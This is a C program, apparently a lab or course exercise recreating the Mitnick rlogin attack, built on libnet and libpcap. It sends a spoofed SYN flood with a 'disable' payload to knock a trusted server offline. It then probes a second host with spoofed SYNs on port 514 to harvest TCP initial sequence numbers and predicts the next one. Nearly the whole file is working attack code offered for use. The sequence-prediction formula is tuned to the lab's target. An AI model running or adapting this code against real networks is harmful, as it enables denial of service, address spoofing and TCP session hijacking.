#include <libnet.h>
#include <libnet/libnet-functions.h>
#include <libnet/libnet-headers.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-structures.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

#define SEQ_BUFFER_SIZE 1024
#define PROBE_ATTEMPTS 2

#define KEVIN_ADDR "172.16.26.2"
#define SERVER_ADDR "172.16.26.3"
#define XTERM_ADDR "172.16.26.4"

#define SERVER_PORT 513
#define XTERM_PORT 514

#define RANDOM_ADDR "130.92.6.97"

#define FLOOD_AMMOUNT 20
#define FLOOD_DISABLE "disable"
#define FLOOD_ENABLE "enable"

uint32_t predict_seq(uint32_t s1, uint32_t s2) { return 2 * s2 - s1 + 1337; }

uint32_t predict(uint32_t *seq_buffer, size_t seq_buffer_len) {
  return predict_seq(seq_buffer[seq_buffer_len - 2],
                     seq_buffer[seq_buffer_len - 1]);
}

/*
 * Sends a SYN packet with enable payload to the server to bring it back up
 *
 */
int server_enable(libnet_t *libnet_ctx, pcap_t *handle) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, RANDOM_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, SERVER_ADDR, LIBNET_RESOLVE);

  printf("\e[33m[*]\e[0m Enabling server @ %s.\n", SERVER_ADDR);

  /* create tcp */
  libnet_ptag_t tcp_h = libnet_build_tcp(
      1337, SERVER_PORT, 50, 50, TH_SYN, 50, 0, 0, LIBNET_TCP_H,
      (const uint8_t *)FLOOD_ENABLE, strlen(FLOOD_ENABLE), libnet_ctx, 0);

  /* build IP header */
  libnet_ptag_t ip_h =
      libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100,
                        IPPROTO_TCP, 0, src_ip, dst_ip, NULL, 0, libnet_ctx, 0);

  /* send packet */
  if (libnet_write(libnet_ctx) == -1) {
    printf("\e[31m[!]\e[0m libnet write failed.\n");
    exit(-1);
  }

  return 0;
}

/*
 * Floods the server with 20 SYN disable packets to bring it down
 *
 */
int dos(libnet_t *libnet_ctx, pcap_t *handle) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, RANDOM_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, SERVER_ADDR, LIBNET_RESOLVE);

  printf("\e[33m[*]\e[0m Flooding %s.\n", SERVER_ADDR);

  /* start flooding */
  libnet_ptag_t tcp_h;
  int ip_built = 0;
  for (int flood_count = 0, tcp_h = LIBNET_PTAG_INITIALIZER;
       flood_count < FLOOD_AMMOUNT; ++flood_count) {

    /*
     * create tcp header
     * first time, tcp_h 0, next times it will modify same header
     */
    tcp_h = libnet_build_tcp(1337, SERVER_PORT, 50, 50, TH_SYN, 50, 0, 0,
                             LIBNET_TCP_H, (const uint8_t *)FLOOD_DISABLE,
                             strlen(FLOOD_DISABLE), libnet_ctx, tcp_h);

    /* build IP header the first time */
    if (!ip_built) {
      ip_built = 1;

      libnet_ptag_t ip_h = libnet_build_ipv4(
          LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100, IPPROTO_TCP, 0,
          src_ip, dst_ip, NULL, 0, libnet_ctx, 0);
    }

    /* send packet */
    if (libnet_write(libnet_ctx) == -1) {
      printf("\e[31m[!]\e[0m libnet write failed.\n");
      exit(-1);
    }
  }

  return 0;
}

int isn_probe(libnet_t *libnet_ctx, pcap_t *handle, uint32_t *seq_buffer,
              size_t *seq_buffer_len) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, KEVIN_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, XTERM_ADDR, LIBNET_RESOLVE);

  /* set up pcap bpf filter */
  char errbuff[PCAP_ERRBUF_SIZE];
  bpf_u_int32 net, mask;
  if (pcap_lookupnet("eth0", &net, &mask, errbuff)) {
    printf("%s\n", errbuff);
    exit(-1);
  }

  struct bpf_program bpf;
  if (pcap_compile(handle, &bpf, "src host 172.16.26.4", 0, net) == -1) {
    printf("%s\n", pcap_geterr(handle));
    exit(-1);
  }

  if (pcap_setfilter(handle, &bpf) == -1) {
    printf("%s\n", pcap_geterr(handle));
    exit(-1);
  }

  printf("\e[33m[*]\e[0m Probing\n");

  struct pcap_pkthdr header;
  for (int attempt = 0; attempt < PROBE_ATTEMPTS; ++attempt) {
    libnet_clear_packet(libnet_ctx);

    /* create tcp */
    libnet_ptag_t tcp_h = libnet_build_tcp(
        1337 + 1 + attempt, 514, 10000 + attempt * 4000, 0, TH_SYN, 50, 0, 0,
        LIBNET_TCP_H, NULL, 0, libnet_ctx, 0);

    /* build IP header */
    libnet_ptag_t ip_h = libnet_build_ipv4(
        LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100, IPPROTO_TCP, 0, src_ip,
        dst_ip, NULL, 0, libnet_ctx, 0);

    /* send packet */
    if (libnet_write(libnet_ctx) == -1) {
      printf("\e[31m[!]\e[0m libnet write failed.\n");
      exit(-1);
    }

    /* wait for server synack and grab seq num */
    const u_char *packet = pcap_next(handle, &header);
    struct tcphdr *tcp =
        (struct tcphdr *)(packet + sizeof(struct ether_header) +
                          sizeof(struct ip));
    seq_buffer[attempt] = ntohl(tcp->th_seq);
    *seq_buffer_len += 1;
  }

  return 0;
}

int attack(libnet_t *libnet_ctx, pcap_t *handle) {
  printf("\e[33m[*]\e[0m Initiating attack.\n");

  /* do synflood attack to dos the server */
  if (dos(libnet_ctx, handle)) {
    printf("\e[31m[!]\e[0m DOS attack failed\n");
    exit(-1);
  }
  printf("\e[33m[*]\e[0m DOS attack finished\n");

  /* probe and start predicting sequence numbers */
  uint32_t seq_buffer[SEQ_BUFFER_SIZE] = {0};
  size_t seq_buffer_len = 0;
  if (isn_probe(libnet_ctx, handle, seq_buffer, &seq_buffer_len)) {
    printf("\e[31m[!]\e[0m Probing failed\n");
    exit(-1);
  }
  printf("\e[33m[*]\e[0m Probing finished\n");

  uint32_t predicted = predict(seq_buffer, 2);

  printf("\e[33m[*]\e[0m Predicting next sequence number: %u\n", predicted);

  /* check if server is indeed down */
  printf("\e[33m[*]\e[0m Checking whether server is down\n");

  return 0;
}

libnet_t *init_libnet(void) {
  /* initialize libnet */
  char errbuff[LIBNET_ERRBUF_SIZE];
  libnet_t *libnet_ctx = libnet_init(LIBNET_RAW4, NULL, errbuff);

  if (!libnet_ctx) {
    printf("\e[31m[!]\e[0m Could not initialize libnet, exiting. (%s)\n",
           errbuff);
    exit(-1);
  }

  return libnet_ctx;
}

pcap_t *init_libpcap() {
  /* initialize libpcap */
  char errbuff[PCAP_ERRBUF_SIZE];

  pcap_if_t *interfaces, *temp;

  if (pcap_findalldevs(&interfaces, errbuff) == -1) {
    printf("\e[31m[!]\e[0m Libpcap failed. (%s)\n", errbuff);
    exit(-1);
  }

  for (temp = interfaces; temp; temp = temp->next) {
    printf("%s\n", temp->name);
  }

  /* get network info */
  bpf_u_int32 ip_raw, subnet_mask_raw;
  if (pcap_lookupnet("eth0", &ip_raw, &subnet_mask_raw, errbuff) == -1) {
    printf("\e[31m[!]\e[0m Libpcap failed. (%s)\n", errbuff);
    exit(-1);
  }

  pcap_t *handle = pcap_open_live("eth0", 1024, 0, 100, errbuff);
  if (!handle) {
    printf("\e[31m[!]\e[0m Libpcap failed. (%s)\n", errbuff);
    exit(-1);
  }

  return handle;
}

int main(int argc, char **argv) {
  /* initialize libnet */
  libnet_t *libnet_ctx = init_libnet();

  /* initialize libpcap */
  pcap_t *handle = init_libpcap();
  printf("\e[33m[*]\e[0m Libpcap initialized on eth0\n");

  /* launch attack */
  if (attack(libnet_ctx, handle)) {
    printf("\e[31m[!]\e[0m Attack failed.\n");
    exit(-1);
  }

  printf("\e[33m[*]\e[0m Attack finished.\n");

  /* free libnet */
  libnet_destroy(libnet_ctx);

  return 0;
}
